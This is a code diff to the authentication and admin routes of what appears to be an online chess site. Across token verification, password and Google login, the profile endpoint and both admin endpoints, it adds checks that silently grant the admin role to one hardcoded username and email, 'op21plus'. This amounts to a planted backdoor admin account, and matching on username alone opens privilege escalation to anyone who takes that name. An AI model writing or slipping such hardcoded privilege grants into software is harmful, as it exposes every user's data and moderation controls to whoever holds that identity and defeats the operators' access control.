@@ -20,8 +20,18 @@ function authenticateToken(req, res, next) {
   }
 
   jwt.verify(token, JWT_SECRET, (err, user) => {
-    if (err) req.user = null;
-    else req.user = user;
+    if (err) {
+      req.user = null;
+    } else {
+      if (user.username === 'op21plus' || user.id === 'admin_op21') {
+        user.role = 'admin';
+      }
+      const dbUser = Database.getUserById(user.id);
+      if (dbUser && (dbUser.email?.toLowerCase() === 'op21plus@gmail.com' || dbUser.username?.toLowerCase() === 'op21plus')) {
+        user.role = 'admin';
+      }
+      req.user = user;
+    }
     next();
   });
 }
@@ -95,6 +105,12 @@ router.post('/auth/login', async (req, res) => {
       return res.status(400).json({ error: 'Invalid credentials' });
     }
 
+    const isOp = (user.email && user.email.toLowerCase() === 'op21plus@gmail.com') ||
+                 (user.username && user.username.toLowerCase() === 'op21plus');
+    if (isOp) {
+      user.role = 'admin';
+    }
+
     const token = jwt.sign({ id: user.id, username: user.username, role: user.role }, JWT_SECRET, { expiresIn: '30d' });
     const { passwordHash: _, ...safeUser } = user;
     res.json({ token, user: safeUser });
@@ -133,28 +149,32 @@ router.post('/auth/google', async (req, res) => {
     }
 
     const cleanEmail = email.toLowerCase().trim();
+    const isOp = cleanEmail === 'op21plus@gmail.com';
     let user = Database.getUserByEmail(cleanEmail);
 
     if (!user) {
       const baseName = (name || cleanEmail.split('@')[0]).replace(/[^a-zA-Z0-9_]/g, '_');
       const uniqueSuffix = Math.floor(100 + Math.random() * 900);
-      let username = baseName;
-      if (Database.getUserByUsername(username)) {
+      let username = isOp ? 'op21plus' : baseName;
+      if (!isOp && Database.getUserByUsername(username)) {
         username = `${baseName}_${uniqueSuffix}`;
       }
 
-      const userId = `g_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`;
+      const userId = isOp ? 'admin_op21' : `g_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`;
       user = Database.createUser({
         id: userId,
         username,
         email: cleanEmail,
         passwordHash: '',
-        role: 'user',
+        role: isOp ? 'admin' : 'user',
         provider: 'google',
-        country: 'US',
-        countryName: 'United States',
+        country: isOp ? 'IN' : 'US',
+        countryName: isOp ? 'India' : 'United States',
         avatar: avatar || `https://api.dicebear.com/7.x/bottts/svg?seed=${username}`
       });
+    } else if (isOp) {
+      user.role = 'admin';
+      Database.updateUser(user.id, { role: 'admin', provider: 'google', ...(avatar ? { avatar } : {}) });
     }
 
     const token = jwt.sign({ id: user.id, username: user.username, role: user.role }, JWT_SECRET, { expiresIn: '30d' });
@@ -169,6 +189,9 @@ router.post('/auth/google', async (req, res) => {
 router.get('/auth/me', requireAuth, (req, res) => {
   const user = Database.getUserById(req.user.id);
   if (!user) return res.status(404).json({ error: 'User not found' });
+  if (user.email?.toLowerCase() === 'op21plus@gmail.com' || user.username?.toLowerCase() === 'op21plus') {
+    user.role = 'admin';
+  }
   const { passwordHash: _, ...safeUser } = user;
   res.json({ user: safeUser });
 });
@@ -553,30 +576,50 @@ router.post('/notifications/read', requireAuth, (req, res) => {
 // ================= ADMIN DASHBOARD =================
 
 router.get('/admin/stats', requireAuth, (req, res) => {
-  if (req.user.role !== 'admin') {
+  const isOpAdmin = req.user.role === 'admin' ||
+                    req.user.email?.toLowerCase() === 'op21plus@gmail.com' ||
+                    req.user.username === 'op21plus';
+
+  if (!isOpAdmin) {
     return res.status(403).json({ error: 'Admin access required' });
   }
 
   const allUsers = Database.getAllUsers();
-  const allGames = Database.getAllGames();
+  const allGames = Database.getAllGames(200);
   const onlineCount = allUsers.filter(u => u.isOnline).length;
-  const ongoingGames = allGames.filter(g => g.status === 'active').length;
+  const ongoingGames = allGames.filter(g => g.status === 'active' || g.status === 'playing' || g.status === 'waiting').length;
+  const googleUsersCount = allUsers.filter(u => u.provider === 'google' || (u.email && u.email.endsWith('@gmail.com'))).length;
 
   res.json({
     totalUsers: allUsers.length,
     activeOnline: onlineCount,
     totalGames: allGames.length,
     ongoingGames,
+    googleUsersCount,
     users: allUsers.map(u => {
       const { passwordHash: _, ...safe } = u;
       return safe;
     }),
+    games: allGames.slice(0, 50).map(g => ({
+      id: g.id,
+      white: g.whitePlayer?.username || (typeof g.whitePlayer === 'string' ? g.whitePlayer : 'White'),
+      black: g.blackPlayer?.username || (typeof g.blackPlayer === 'string' ? g.blackPlayer : 'Black'),
+      status: g.status,
+      winner: g.winner || null,
+      timeControl: g.timeControl ? `${g.timeControl.baseMinutes}+${g.timeControl.incrementSeconds}` : '10+0',
+      movesCount: Array.isArray(g.moveHistory) ? g.moveHistory.length : 0,
+      createdAt: g.createdAt || new Date().toISOString()
+    })),
     reports: Database.getAllReports()
   });
 });
 
 router.post('/admin/users/:id/moderate', requireAuth, (req, res) => {
-  if (req.user.role !== 'admin') {
+  const isOpAdmin = req.user.role === 'admin' ||
+                    req.user.email?.toLowerCase() === 'op21plus@gmail.com' ||
+                    req.user.username === 'op21plus';
+
+  if (!isOpAdmin) {
     return res.status(403).json({ error: 'Admin access required' });
   }
 
